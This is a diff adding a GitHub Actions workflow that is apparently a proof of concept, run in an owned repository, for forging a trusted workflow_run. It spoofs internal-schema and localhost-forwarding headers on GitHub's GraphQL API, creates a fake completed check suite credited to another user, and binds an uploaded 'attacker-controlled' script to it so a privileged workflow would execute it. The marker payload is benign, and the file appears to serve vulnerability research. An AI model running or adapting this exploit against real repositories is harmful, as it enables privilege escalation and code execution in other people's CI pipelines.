@@ -1,0 +1,166 @@
+name: Owned synthetic workflow_run trigger
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+permissions:
+  actions: read
+  checks: write
+  contents: read
+
+jobs:
+  forge-completion:
+    # The live owned harness introduces this file through an isolated PR. Do
+    # not run the proof from the temporary PR branch; run it only after the
+    # controlled repository owner merges it onto the default branch.
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prove this token cannot create issues
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPOSITORY: ${{ github.repository }}
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          response_file="$RUNNER_TEMP/issues-control.json"
+          http_code="$(curl --silent --show-error \
+            --output "$response_file" \
+            --write-out '%{http_code}' \
+            --request POST \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H 'Accept: application/vnd.github+json' \
+            -H 'Content-Type: application/json' \
+            "https://api.github.com/repos/$REPOSITORY/issues" \
+            --data '{"title":"must-not-be-created"}')"
+
+          printf 'direct_issue_create_status=%s\n' "$http_code"
+          test "$http_code" = 403
+
+      - name: Create a benign attacker-controlled artifact payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p owned-payload
+          printf '%s\n' \
+            '#!/usr/bin/env bash' \
+            'set -euo pipefail' \
+            'marker="owned-workflow-run-artifact-forgery-${UPSTREAM_RUN_ID}"' \
+            'created="$(gh api --method POST "repos/$REPOSITORY/issues" -f title="$marker" -f body="Benign owned-repository marker: this script came from an artifact uploaded by the low-privilege trigger, was rebound to a synthetic trusted run, and executed in the privileged workflow_run consumer.")"' \
+            'issue_number="$(jq -r .number <<<"$created")"' \
+            'issue_url="$(jq -r .html_url <<<"$created")"' \
+            'gh api --method PATCH "repos/$REPOSITORY/issues/$issue_number" -f state=closed >/dev/null' \
+            'printf "marker=%s\\nissue_number=%s\\nissue_url=%s\\n" "$marker" "$issue_number" "$issue_url"' \
+            > owned-payload/payload.sh
+
+      - name: Upload the attacker-controlled artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: owned-attacker-payload
+          path: owned-payload/payload.sh
+          if-no-files-found: error
+
+      - name: Create and complete a zero-job run for the trusted workflow
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPOSITORY: ${{ github.repository }}
+          HEAD_SHA: ${{ github.sha }}
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          repo_json="$(gh api "repos/$REPOSITORY")"
+          repository_id="$(jq -r .node_id <<<"$repo_json")"
+          spoofed_creator_id="$(gh api 'users/octocat' --jq .node_id)"
+          external_id="$(cat /proc/sys/kernel/random/uuid)"
+
+          current_run="$(gh api "repos/$REPOSITORY/actions/runs/$GITHUB_RUN_ID")"
+          current_suite_database_id="$(jq -r .check_suite_id <<<"$current_run")"
+          current_suite="$(gh api "repos/$REPOSITORY/check-suites/$current_suite_database_id")"
+          current_suite_id="$(jq -r .node_id <<<"$current_suite")"
+
+          artifact_query='query($id:ID!){node(id:$id){... on CheckSuite{artifacts(first:100){nodes{name size sourceUrl}}}}}'
+          artifact_source_url=''
+          artifact_size=''
+          for _ in $(seq 1 20); do
+            artifact_response="$(curl --fail-with-body --silent --show-error \
+              -H "Authorization: Bearer $GH_TOKEN" \
+              -H 'Content-Type: application/json' \
+              -H 'GraphQL-Schema: internal' \
+              -H 'Forwarded: for=127.0.0.1' \
+              https://api.github.com/graphql \
+              --data "$(jq -nc --arg query "$artifact_query" --arg id "$current_suite_id" '{query:$query,variables:{id:$id}}')")"
+            artifact_source_url="$(jq -r '.data.node.artifacts.nodes[]? | select(.name == "owned-attacker-payload") | .sourceUrl' <<<"$artifact_response" | head -n1)"
+            artifact_size="$(jq -r '.data.node.artifacts.nodes[]? | select(.name == "owned-attacker-payload") | .size' <<<"$artifact_response" | head -n1)"
+            if [[ -n "$artifact_source_url" && "$artifact_source_url" != null ]]; then
+              break
+            fi
+            sleep 2
+          done
+          test -n "$artifact_source_url"
+          test "$artifact_source_url" != null
+          test -n "$artifact_size"
+          echo "::add-mask::$artifact_source_url"
+          printf 'source_artifact_name=owned-attacker-payload source_artifact_size=%s\n' "$artifact_size"
+
+          create_mutation='mutation($repositoryId:ID!,$headSha:GitObjectID!,$creatorId:ID!,$externalId:String!){createCheckSuite(input:{repositoryId:$repositoryId,headSha:$headSha,headBranch:"internal-schema-probe-20261031",name:"Owned trusted upstream control",event:"push",creatorId:$creatorId,externalId:$externalId,explicitCompletion:true,workflowFilePath:".github/workflows/trusted-upstream.yml",workflowName:"Owned trusted upstream control"}){checkSuite{id databaseId status conclusion creator{login} workflowRun{databaseId workflow{id databaseId name}}} errors{message path}}}'
+          create_payload="$(jq -nc \
+            --arg query "$create_mutation" \
+            --arg repositoryId "$repository_id" \
+            --arg headSha "$HEAD_SHA" \
+            --arg creatorId "$spoofed_creator_id" \
+            --arg externalId "$external_id" \
+            '{query:$query,variables:{repositoryId:$repositoryId,headSha:$headSha,creatorId:$creatorId,externalId:$externalId}}')"
+          created="$(curl --fail-with-body --silent --show-error \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H 'Content-Type: application/json' \
+            -H 'GraphQL-Schema: internal' \
+            -H 'Forwarded: for=127.0.0.1' \
+            https://api.github.com/graphql \
+            --data "$create_payload")"
+
+          jq '{suite:.data.createCheckSuite.checkSuite,mutationErrors:.data.createCheckSuite.errors,topLevelErrors:.errors}' <<<"$created"
+          suite_id="$(jq -r '.data.createCheckSuite.checkSuite.id // empty' <<<"$created")"
+          suite_database_id="$(jq -r '.data.createCheckSuite.checkSuite.databaseId // empty' <<<"$created")"
+          upstream_run_id="$(jq -r '.data.createCheckSuite.checkSuite.workflowRun.databaseId // empty' <<<"$created")"
+          test -n "$suite_id"
+          test -n "$upstream_run_id"
+
+          artifact_created_at="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          artifact_expires_at="$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%SZ)"
+          update_mutation='mutation($repositoryId:ID!,$checkSuiteId:ID!,$artifacts:[ArtifactData!]!){updateCheckSuite(input:{repositoryId:$repositoryId,checkSuiteId:$checkSuiteId,artifacts:$artifacts,conclusion:"success"}){checkSuite{id databaseId status conclusion artifacts(first:10){nodes{name size}} workflowRun{databaseId workflow{id databaseId name}}} errors{message path}}}'
+          update_payload="$(jq -nc \
+            --arg query "$update_mutation" \
+            --arg repositoryId "$repository_id" \
+            --arg checkSuiteId "$suite_id" \
+            --arg sourceUrl "$artifact_source_url" \
+            --arg name 'owned-attacker-payload' \
+            --argjson size "$artifact_size" \
+            --arg createdAt "$artifact_created_at" \
+            --arg expiresAt "$artifact_expires_at" \
+            '{query:$query,variables:{repositoryId:$repositoryId,checkSuiteId:$checkSuiteId,artifacts:[{sourceUrl:$sourceUrl,name:$name,size:$size,createdAt:$createdAt,expiresAt:$expiresAt}]}}')"
+          updated="$(curl --fail-with-body --silent --show-error \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H 'Content-Type: application/json' \
+            -H 'GraphQL-Schema: internal' \
+            -H 'Forwarded: for=127.0.0.1' \
+            https://api.github.com/graphql \
+            --data "$update_payload")"
+
+          jq '{suite:.data.updateCheckSuite.checkSuite,mutationErrors:.data.updateCheckSuite.errors,topLevelErrors:.errors}' <<<"$updated"
+          jq -e '.errors == null and .data.updateCheckSuite.checkSuite.status == "COMPLETED" and .data.updateCheckSuite.checkSuite.conclusion == "SUCCESS" and (.data.updateCheckSuite.checkSuite.artifacts.nodes | any(.name == "owned-attacker-payload"))' <<<"$updated" >/dev/null
+          jq -e '.data.createCheckSuite.checkSuite.creator.login == "octocat"' <<<"$created" >/dev/null
+
+          observed_run="$(gh api "repos/$REPOSITORY/actions/runs/$upstream_run_id")"
+          observed_jobs="$(gh api "repos/$REPOSITORY/actions/runs/$upstream_run_id/jobs")"
+          jq '{id,name,path,event,status,conclusion,actor,triggering_actor,head_branch,head_sha,check_suite_id}' <<<"$observed_run"
+          jq '{total_count,jobs:[.jobs[] | {id,name,status,conclusion}]}' <<<"$observed_jobs"
+          jq -e --argjson suite_id "$suite_database_id" '.status == "completed" and .conclusion == "success" and .head_branch == "internal-schema-probe-20261031" and .check_suite_id == $suite_id' <<<"$observed_run" >/dev/null
+          jq -e '.actor.login == "octocat"' <<<"$observed_run" >/dev/null
+          jq -e '.total_count == 0' <<<"$observed_jobs" >/dev/null
+
+          printf 'synthetic_upstream_run_id=%s\n' "$upstream_run_id"
